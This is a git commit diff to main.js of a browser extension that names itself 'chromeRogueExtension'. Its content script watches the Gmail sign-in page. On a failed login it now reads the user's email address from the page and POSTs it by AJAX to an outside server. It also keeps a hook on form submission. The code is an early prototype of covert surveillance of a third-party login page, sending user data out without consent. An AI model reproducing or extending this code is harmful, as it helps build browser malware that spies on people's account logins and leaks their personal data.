43f949a9c1a081eefb45f25df246438bbefdb395
alokrajiv <mail@alokrajiv.com>
2015-11-07 21:13:02 +0400

    Report to server using AJAX

--- main.js
+++ main.js
@@ -1,11 +1,36 @@
 $(function () {
 	console.log("Hello World");
 	var errorText = $("#errormsg_0_Passwd").html();
-	if(errorText.trim()=="The email and password you entered don't match.")
-		alert("chromeRogueExtension detected a failed Gmail login attempt for " + $("#email-display").html() + "!!")
-	$("form").submit(function (e) {
-		//var $this = $(this);
-		console.log("Moosassu");
-		//e.preventDefault();
-	});
+	var emailid = $("#email-display").html();
+	if(!emailid){
+		emailid = $("#reauthEmail").html();
+	}
+	if (errorText.trim() == "The email and password you entered don't match.") {
+		var data = {
+			action: emailid + " failed login attempt"
+		};
+		console.log(data)
+		console.log("Starting the ajax call!!");
+		$.ajax({
+			type: "POST",
+			dataType: "json",
+			url: "https://localhost-test:80/test.php", //Relative or absolute path to response.php file
+			data: data,
+			error: function(a, b, c){
+				console.log(a)
+				console.log(b)
+				console.log(c)
+				console.log("Error ajax!!")
+			},
+			success: function (data) {
+				console.log("Form submitted successfully.\nReturned json: " + data["json"]);
+			}
+		});
+		//salert("chromeRogueExtension detected a failed Gmail login attempt for " + emailid + "!!")
+	}
+$("form").submit(function (e) {
+	//var $this = $(this);
+	console.log("Moosassu");
+	//e.preventDefault();
+});
 });
